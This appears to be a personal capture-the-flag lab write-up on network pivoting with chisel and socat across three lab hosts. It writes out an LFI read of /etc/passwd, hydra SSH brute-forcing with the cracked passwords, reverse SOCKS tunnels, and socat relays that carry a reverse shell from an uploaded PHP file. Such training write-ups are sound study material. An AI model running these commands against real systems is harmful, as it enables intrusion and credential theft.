# Objective
Practice manual pivoting with **socat** and **chisel**
# Reconnaissance

![[Pasted image 20260925151635.png]]

Unlike the previous time, now i know how the network is linked

## Interfaces

``` sh
ip a | grep 'state UP'
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
4: br-5b5a61d71b66: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
```
## Kali's IP

``` sh
hostname -i
127.0.1.1
```
## Subnet

``` sh
sudo arp-scan -I br-5b5a61d71b66 --localnet
Interface: br-5b5a61d71b66, type: EN10MB, MAC: de:86:d2:e5:35:66, IPv4: 10.10.10.1
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.10.10.2      9a:87:e3:58:11:9f       (Unknown: locally administered)
```
# Inclusion
## Ports scanning

``` sh
sudo nmap -sS -sC -sV -p- --open -Pn -n 10.10.10.2
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
## Web enumeration
### Dir fuzzing

``` sh
gobuster dir -u http://10.10.10.2/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.2/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
shop                 (Status: 301) [Size: 307] [--> http://10.10.10.2/shop/]
server-status        (Status: 403) [Size: 275]
Progress: 207641 / 207641 (100.00%)
===============================================================
Finished
===============================================================
```
``` sh
curl -s http://10.10.10.2/shop/ | grep GET
"Error de Sistema: ($_GET['archivo']");
```
### LFI

``` sh
ffuf -u http://10.10.10.2/shop/index.php?archivo=FUZZ -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fs 1112 | grep etc/passwd | head -n 1

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.2/shop/index.php?archivo=FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 1112
________________________________________________

../../../../../../etc/passwd [Status: 200, Size: 1107, Words: 372, Lines: 45, Duration: 0ms]
:: Progress: [353/930] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

``` sh
curl -s http://10.10.10.2/shop/index.php?archivo=../../../../../../etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
seller:x:1000:1000:seller,,,:/home/seller:/bin/bash
manchi:x:1001:1001:manchi,,,:/home/manchi:/bin/bash
```
## SSH
### Hydra

``` sh
cat > users.txt << EOF
root
seller
manchi
EOF
```

``` sh
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 10.10.10.2 ssh -u -F -t 32
[22][ssh] host: 10.10.10.2   login: manchi   password: lovely
```
## Post enumeration
### IPs
``` sh
hostname -i
10.10.10.2 20.20.20.2
```
### Ping sweep (bash one liner)

``` sh
for i in $(seq 254); do ping 20.20.20.$i -c1 -W1 & done | grep from
64 bytes from 20.20.20.2: icmp_seq=1 ttl=64 time=0.026 ms
64 bytes from 20.20.20.3: icmp_seq=1 ttl=64 time=0.020 ms
```
# Pivot 1

Get chisel and socat from kali
``` sh
wget http://10.10.10.1/chisel
wget http://10.10.10.1:8000/socat
chmod +x chisel
chmod +x socat
```

In kali
``` sh
chisel server --reverse --port 33
```

In inclusion
``` sh
./chisel client 10.10.10.1:33 R:socks
```

Proxychains config
``` sh
tail -n 1 /etc/proxychains4.conf
socks5  127.0.0.1 1080
```
# Trust
## Ports scanning

``` sh
proxychains nmap -sT -Pn -n 20.20.20.3
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
## Web enumeration
### Dir Fuzzing

``` sh
gobuster dir -u http://20.20.20.3 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -x php --proxy socks5://127.0.0.1:1080
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://20.20.20.3
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] Proxy:                   socks5://127.0.0.1:1080
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
secret.php           (Status: 200) [Size: 927]
server-status        (Status: 403) [Size: 275]
Progress: 415282 / 415282 (100.00%)
===============================================================
Finished
===============================================================
```

``` sh
proxychains curl -s http://20.20.20.3/secret.php | grep '<h1>'
<h1>Hola Mario,</h1>
```
## SSH
### hydra

``` sh
proxychains hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://20.20.20.3 -t 32
[22][ssh] host: 20.20.20.3   login: mario   password: chocolate
```
### Login

``` sh
proxychains ssh mario@20.20.20.3
```
## Post enumeration
### IPs

``` sh
hostname -i
20.20.20.3 30.30.30.2
```
# Pivot 2

Get the tools
``` sh
wget http://20.20.20.2:8000/chisel && wget http://20.20.20.2:8000/socat
chmod +x chisel && chmod +x socat
```

In kali
``` sh
chisel server --reverse --port 33
2026/09/28 11:28:46 server: Reverse tunnelling enabled
2026/09/28 11:28:46 server: Fingerprint jvQXNl6enHCBL2IipAReKhQkQnW2TQjjef9yWpnXA+s=
2026/09/28 11:28:46 server: Listening on http://0.0.0.0:33
2026/09/28 11:29:03 server: session#1: Open (user=- addr=10.10.10.2:51036 remotes=R:127.0.0.1:1080:socks)
2026/09/28 11:29:03 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
2026/09/28 12:29:59 server: session#6: Open (user=- addr=10.10.10.2:37708 remotes=R:127.0.0.1:1081:socks)
2026/09/28 12:29:59 server: session#6: tun: proxy#R:127.0.0.1:1081=>socks: Listening
```

In inclusion
``` sh
./socat tcp-l:333,fork,reuseaddr tcp:10.10.10.1:33
```

In trust
``` sh
./chisel client 20.20.20.2:333 R:1081:socks
```

Proxychains config
``` sh
tail -n 1 /etc/proxychains4.conf
socks5  127.0.0.1 1081
socks5  127.0.0.1 1080
```
# Upload

## Reverse shell

To get the reverse shell the host needs to see out kali

In kali
``` sh
sudo nc -lvnp 443
```

In inclusion
``` sh
./socat tcp-l:4443,fork,reuseaddr tcp:10.10.10.1:443
```

In trust
``` sh
./socat tcp-l:4444,fork,reuseaddr tcp:20.20.20.2:4443
```

Then
``` sh
proxychains curl -s http://30.30.30.3/uploads/revshell.php
```

``` sh
whoami
www-data
hostname -i
30.30.30.3
```